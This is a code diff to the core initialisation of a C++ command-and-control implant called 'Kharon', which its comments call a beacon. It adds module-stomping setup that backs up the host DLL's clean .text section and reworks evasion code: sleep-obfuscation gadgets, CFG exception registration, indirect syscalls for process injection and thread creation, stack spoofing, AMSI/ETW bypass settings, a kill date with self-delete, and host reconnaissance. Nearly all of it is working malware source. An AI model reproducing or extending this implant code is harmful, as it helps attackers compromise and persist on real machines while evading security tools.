@@ -8,10 +8,17 @@ inline void operator delete(void*, void*) noexcept {}
 EXTERN_C DECLFN auto Main(
     _In_ UPTR Argument
 ) -> VOID {
-    /* ========= [ check guardrails ] ========= */
+    //
+    // check guardrails
+    //
+
     if ( Guardrails() ) {
         return;
     }
+
+    //
+    // put beacon into peb to global usage
+    //
 
     PEB* peb = NtCurrentPeb();
 
@@ -54,6 +61,10 @@ EXTERN_C DECLFN auto Main(
     peb->ProcessHeaps[peb->NumberOfHeaps] = Kh;
     peb->NumberOfHeaps++;
 
+    //
+    // initialize classes
+    //
+
     Crypt*     KhCrypt   = (Crypt*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Crypt));     new (KhCrypt) Crypt(Kh);
     Spoof*     KhSpoof   = (Spoof*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Spoof));     new (KhSpoof) Spoof(Kh);
     Coff*      KhCoff    = (Coff*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Coff));      new (KhCoff) Coff(Kh);
@@ -90,7 +101,15 @@ EXTERN_C DECLFN auto Main(
     Kh->InitPackage( KhPackage );
     Kh->InitParser( KhParser );
 
+    //
+    // initialize the beacon config
+    //
+
     Kh->Init();
+
+    //
+    // execute the principal routine
+    //
 
     Kh->Start( Argument );
 
@@ -100,11 +119,17 @@ EXTERN_C DECLFN auto Main(
 DECLFN Kharon::Kharon( VOID ) {
     if ( this->Session.Base.Start ) return;
 
-    /* ========= [ get base ] ========= */
+    //
+    // get in memory beacon information
+    //
+
     this->Session.Base.Start  = StartPtr();
     this->Session.Base.Length = ( EndPtr() - this->Session.Base.Start );
 
-    /* ========= [ init modules and funcs ] ========= */
+    //
+    // initialize the core modules
+    //
+
     this->Krnl32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
     this->KrnlBase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernelbase.dll" ) );
     this->Ntdll.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );
@@ -117,7 +142,10 @@ DECLFN Kharon::Kharon( VOID ) {
 auto DECLFN Kharon::Init(
     VOID
 ) -> void {
-    /* ========= [ get config ] ========= */
+    //
+    // get config from compilation
+    //
+
     KHARON_CONFIG Cfg = { 0 };
 
     GetConfig( &Cfg );
@@ -125,7 +153,10 @@ auto DECLFN Kharon::Init(
     this->Session.AgentID = Cfg.AgentId;
     this->Config          = Cfg;
 
-    /* ========= [ init modules and funcs ] ========= */
+    //
+    // try resolve modules if loadeds
+    //
+
     this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
     this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
     this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
@@ -133,9 +164,9 @@ auto DECLFN Kharon::Init(
     this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
     this->Iphlpapi.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "iphlpapi.dll" ) );
 
-    /* ========= [ calculate stack for spoof ] ========= */
-    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
-    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );
+    //
+    // if not loaded, load modules
+    //
 
     if ( ! this->Advapi32.Handle  ) this->Advapi32.Handle  = this->Lib->Load( "advapi32.dll"  );
     if ( ! this->Wininet.Handle   ) this->Wininet.Handle   = this->Lib->Load( "wininet.dll"   );
@@ -151,7 +182,12 @@ auto DECLFN Kharon::Init(
     RSL_IMP( Ws2_32    );
     RSL_IMP( Iphlpapi  );
 
-    this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
+    //
+    // resolve some functions
+    //
+
+    this->Ntdll._RtlFillMemory = ( decltype( this->Ntdll._RtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
+    this->Ntdll._RtlCopyMemory = ( decltype( this->Ntdll._RtlCopyMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlCopyMemory" ) );
     this->Krnl32.InitializeProcThreadAttributeList = ( decltype( this->Krnl32.InitializeProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "InitializeProcThreadAttributeList" );
     this->Krnl32.UpdateProcThreadAttribute         = ( decltype( this->Krnl32.UpdateProcThreadAttribute ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "UpdateProcThreadAttribute" );
     this->Krnl32.DeleteProcThreadAttributeList     = ( decltype( this->Krnl32.DeleteProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "DeleteProcThreadAttributeList" );
@@ -168,59 +204,169 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
     KhDbgz( "Library iphlpapi.dll  Loaded at %p and Functions Resolveds", this->Iphlpapi.Handle  );
 
+    //
+    // setup sleep obf gadgets
+    //
+
     this->Config.Mask.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
-    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
+    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, this->Config.Mask.JmpRegGadget );
 
     if ( ! this->Config.Mask.NtContinueGadget ) {
         KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
         this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
     }
 
-    /* ========= [ cfg exceptions to sleep obf ] ========= */
+    //
+    // get memory location that beacon is located
+    //
+
+    MEMORY_BASIC_INFORMATION BeaconMemory = {};
+
+if ( this->Krnl32.VirtualQuery( (PVOID)this->Session.Base.Start, &BeaconMemory, sizeof(BeaconMemory) ) ) {
+        this->Session.MemoryType = BeaconMemory.Type;
+
+        if ( this->Session.MemoryType == MEM_IMAGE ) {
+            this->Session.Stomp.TextSize  = BeaconMemory.RegionSize;
+            this->Session.Stomp.Base      = BeaconMemory.AllocationBase;
+            this->Session.Stomp.TextStart = BeaconMemory.BaseAddress;
+            this->Session.Stomp.DllHandle = (HMODULE) BeaconMemory.AllocationBase;
+
+            this->Session.Stomp.DllNamew = (PWCHAR)this->Hp->Alloc( MAX_PATH * sizeof(WCHAR) );
+
+            if ( this->Krnl32.GetModuleFileNameW( (HMODULE) BeaconMemory.AllocationBase, this->Session.Stomp.DllNamew, MAX_PATH ) ) {
+                this->Session.Stomp.DllPathw = (PWCHAR)this->Usf->ModulePath( Hsh::Str<WCHAR>( this->Session.Stomp.DllNamew ) );
+
+                ULONG PathLenA = Str::LengthW( this->Session.Stomp.DllPathw ) + 1;
+                this->Session.Stomp.DllPathc = (CHAR*) this->Hp->Alloc( PathLenA );
+                if ( this->Session.Stomp.DllPathc ) {
+                    Str::WCharToChar( this->Session.Stomp.DllPathc, this->Session.Stomp.DllPathw, PathLenA );
+                }
+
+                HANDLE DllFile = this->Krnl32.CreateFileW(
+                    this->Session.Stomp.DllPathw, GENERIC_READ, FILE_SHARE_READ,
+                    nullptr, OPEN_EXISTING, 0, nullptr
+                );
+
+                if ( DllFile && DllFile != INVALID_HANDLE_VALUE ) {
+
+                    HANDLE  DllSection = nullptr;
+                    NTSTATUS NtStatus  = this->Mm->CreateSection(
+                        &DllSection, SECTION_MAP_READ, nullptr, nullptr,
+                        PAGE_READONLY, SEC_IMAGE, DllFile
+                    );
+
+                    if ( NT_SUCCESS( NtStatus ) && DllSection ) {
+
+                        PVOID  DllMap   = nullptr;
+                        SIZE_T ViewSize = 0;
+                        NtStatus = this->Mm->MapView(
+                            DllSection, NtCurrentProcess(), &DllMap, 0, 0,
+                            nullptr, &ViewSize, ViewUnmap, 0, PAGE_READONLY
+                        );
+
+                        if ( NT_SUCCESS( NtStatus ) && DllMap ) {
+
+                            PIMAGE_DOS_HEADER Dos = C_PTR_AS( PIMAGE_DOS_HEADER, DllMap );
+                            if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
+
+                                PIMAGE_NT_HEADERS Nt = C_PTR_AS( PIMAGE_NT_HEADERS, U_PTR( DllMap ) + Dos->e_lfanew );
+                                if ( Nt->Signature == IMAGE_NT_SIGNATURE ) {
+
+                                    this->Session.Stomp.FullSize = Nt->OptionalHeader.SizeOfImage;
+
+                                    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION( Nt );
+                                    for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
+                                        if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
+
+                                            PVOID CleanText = (PVOID)( U_PTR( DllMap ) + Section[i].VirtualAddress );
+                                            ULONG CleanSize = Section[i].Misc.VirtualSize;
+
+                                            this->Session.Stomp.DllBackup = this->Hp->Alloc( CleanSize );
+                                            if ( this->Session.Stomp.DllBackup ) {
+                                                Mem::Copy( this->Session.Stomp.DllBackup, CleanText, CleanSize );
+                                                KhDbgz( "stomp init: backed up clean .text [0x%X bytes] from disk mapping at %p",
+                                                    CleanSize, CleanText );
+                                            }
+
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+
+                            this->Mm->UnmapView( NtCurrentProcess(), DllMap );
+                        }
+
+                        this->Ntdll.NtClose( DllSection );
+                    }
+
+                    this->Ntdll.NtClose( DllFile );
+                }
+            }
+
+            KhDbgz( "stomp init: base=%p text=%p size=0x%X path=%ls",
+                this->Session.Stomp.Base, this->Session.Stomp.TextStart,
+                this->Session.Stomp.TextSize, this->Session.Stomp.DllPathw );
+        }
+    }
+
+    //
+    // handle cfg exceptions to sleep obf if enabled
+    //
+
     if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
-        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Config.Mask.JmpGadget );
-        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
-        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
-        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
-        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.WaitForSingleObjectEx );
-        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.VirtualProtect );
-        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.SetEvent );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Config.Mask.JmpGadget );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtSetContextThread );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtGetContextThread );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtWaitForSingleObject );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.WaitForSingleObjectEx );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.VirtualProtect );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.SetEvent );
         this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction040 );
         this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction041 );
     }
 
-    /* ========= [ syscalls setup ] ========= */
-    this->Sys->Ext[Sys::Alloc].Address       = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
-    this->Sys->Ext[Sys::Write].Address       = U_PTR( this->Ntdll.NtWriteVirtualMemory );
-    this->Sys->Ext[Sys::OpenProc].Address    = U_PTR( this->Ntdll.NtOpenProcess );
-    this->Sys->Ext[Sys::OpenThrd].Address    = U_PTR( this->Ntdll.NtOpenThread );
-    this->Sys->Ext[Sys::QueueApc].Address    = U_PTR( this->Ntdll.NtQueueApcThread );
-    this->Sys->Ext[Sys::Protect].Address     = U_PTR( this->Ntdll.NtProtectVirtualMemory );
-    this->Sys->Ext[Sys::CrThread].Address    = U_PTR( this->Ntdll.NtCreateThreadEx );
-    this->Sys->Ext[Sys::CrSectn].Address     = U_PTR( this->Ntdll.NtCreateSection );
-    this->Sys->Ext[Sys::MapView].Address     = U_PTR( this->Ntdll.NtMapViewOfSection );
-    this->Sys->Ext[Sys::Read].Address        = U_PTR( this->Ntdll.NtReadVirtualMemory );
-    this->Sys->Ext[Sys::Free].Address        = U_PTR( this->Ntdll.NtFreeVirtualMemory );
-    this->Sys->Ext[Sys::GetCtxThrd].Address  = U_PTR( this->Ntdll.NtGetContextThread );
-    this->Sys->Ext[Sys::SetCtxThrd].Address  = U_PTR( this->Ntdll.NtSetContextThread );
-    this->Sys->Ext[Sys::OpenPrToken].Address = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
-    this->Sys->Ext[Sys::OpenThToken].Address = U_PTR( this->Ntdll.NtOpenProcessTokenEx );
+    //
+    // setup syscall informatio to do indirect calls
+    //
+
+    this->Sys->Ext[Sys::Alloc].Address          = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
+    this->Sys->Ext[Sys::Write].Address          = U_PTR( this->Ntdll.NtWriteVirtualMemory );
+    this->Sys->Ext[Sys::OpenProc].Address       = U_PTR( this->Ntdll.NtOpenProcess );
+    this->Sys->Ext[Sys::OpenTd].Address         = U_PTR( this->Ntdll.NtOpenThread );
+    this->Sys->Ext[Sys::QueueApc].Address       = U_PTR( this->Ntdll.NtQueueApcThread );
+    this->Sys->Ext[Sys::Protect].Address        = U_PTR( this->Ntdll.NtProtectVirtualMemory );
+    this->Sys->Ext[Sys::CreateTd].Address       = U_PTR( this->Ntdll.NtCreateThreadEx );
+    this->Sys->Ext[Sys::CreateSection].Address  = U_PTR( this->Ntdll.NtCreateSection );
+    this->Sys->Ext[Sys::MapView].Address        = U_PTR( this->Ntdll.NtMapViewOfSection );
+    this->Sys->Ext[Sys::Read].Address           = U_PTR( this->Ntdll.NtReadVirtualMemory );
+    this->Sys->Ext[Sys::Free].Address           = U_PTR( this->Ntdll.NtFreeVirtualMemory );
+    this->Sys->Ext[Sys::GetCtxThread].Address   = U_PTR( this->Ntdll.NtGetContextThread );
+    this->Sys->Ext[Sys::SetCtxThread].Address   = U_PTR( this->Ntdll.NtSetContextThread );
+    this->Sys->Ext[Sys::OpenPrToken].Address    = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
+    this->Sys->Ext[Sys::OpenThToken].Address    = U_PTR( this->Ntdll.NtOpenProcessTokenEx );
     
     for ( INT i = 0; i < Sys::Last; i++ ) {
         this->Sys->Fetch( i );
     }
 
-    /* ========= [ key generation to xor heap and package ] ========= */
+    //
+    // generate key to encryption
+    //
+
     for ( INT i = 0; i < sizeof( this->Crp->LokKey ); i++ ) {
         this->Crp->LokKey[i] = (BYTE)Rnd32();
-        KhDbgz("key: 0x%x", this->Crp->LokKey[i]);
     }
 
     for (int i = 0; i < sizeof(this->Crp->XorKey); i++) {
         this->Crp->XorKey[i] = this->Crp->LokKey[sizeof(this->Crp->LokKey) - 1 - i];
     }
 
-    /* ========= [ informations collection ] ========= */
+    
+    //
+    // collect machine informations
+    //
+
     CHAR   cProcessorName[MAX_PATH] = { 0 };
 
     BOOL   IsWow64      = FALSE;
@@ -418,21 +564,21 @@ auto DECLFN Kharon::Init(
 
     KhDbgz("======== Evasion Settings ========");
     KhDbgz("Bypass      : %s", 
-        this->Config.AmsiEtwBypass == 0x000 ? "None" :
-        this->Config.AmsiEtwBypass == 0x100 ? "All"  :
-        this->Config.AmsiEtwBypass == 0x700 ? "AMSI" :
-        this->Config.AmsiEtwBypass == 0x400 ? "ETW"  : "Unknown"
+        this->Config.Evasion.AmsiEtwBypass == 0x00 ? "None" :
+        this->Config.Evasion.AmsiEtwBypass == 0x03 ? "All"  :
+        this->Config.Evasion.AmsiEtwBypass == 0x02 ? "AMSI" :
+        this->Config.Evasion.AmsiEtwBypass == 0x01 ? "ETW"  : "Unknown"
     );
-    KhDbgz("BOF Proxy  : %s", this->Config.BofProxy         ? "Enabled" : "Disabled");
+    KhDbgz("BOF Proxy  : %s", this->Config.Evasion.BofProxy  ? "Enabled" : "Disabled");
     KhDbgz("Mask Heap  : %s", this->Config.Mask.Heap        ? "Enabled" : "Disabled");
     KhDbgz("Mask Beacon: %s", 
         this->Config.Mask.Beacon == eMask::Timer ? "Timer" : 
         this->Config.Mask.Beacon == eMask::None  ? "None"  : "Unknown"
     );
     KhDbgz("Syscall: %s", 
-        this->Config.Syscall == SYSCALL_SPOOF_INDIRECT ? "Spoof + Indirect" :
-        this->Config.Syscall == SYSCALL_SPOOF          ? "Spoof"            :
-        this->Config.Syscall == SYSCALL_NONE           ? "None"             : "Unknown"
+        this->Config.Evasion.Syscall == SYSCALL_SPOOF_INDIRECT ? "Spoof + Indirect" :
+        this->Config.Evasion.Syscall == SYSCALL_SPOOF          ? "Spoof"            :
+        this->Config.Evasion.Syscall == SYSCALL_NONE           ? "None"             : "Unknown"
     );
     KhDbgz("Spawnto: %S\n", this->Config.Postex.Spawnto);
 
@@ -452,9 +598,6 @@ auto DECLFN Kharon::Init(
     KhDbgz("Killdate Date : %d/%d/%d", this->Config.KillDate.Month, this->Config.KillDate.Day, this->Config.KillDate.Year);
     KhDbgz("Killdate Exit : %s", this->Config.KillDate.ExitProc ? "Process" : "Thread");
     KhDbgz("Killdate Self Delete: %s\n", this->Config.KillDate.SelfDelete ? "Enabled" : "Disabled");
-
-    KhDbgz("======== Chunk Size Settings ========");
-    KhDbgz("Chunk Size: %d\n", this->Config.ChunkSize);    
 
     KhDbgz( "Collected informations and setup agent\n" );
 
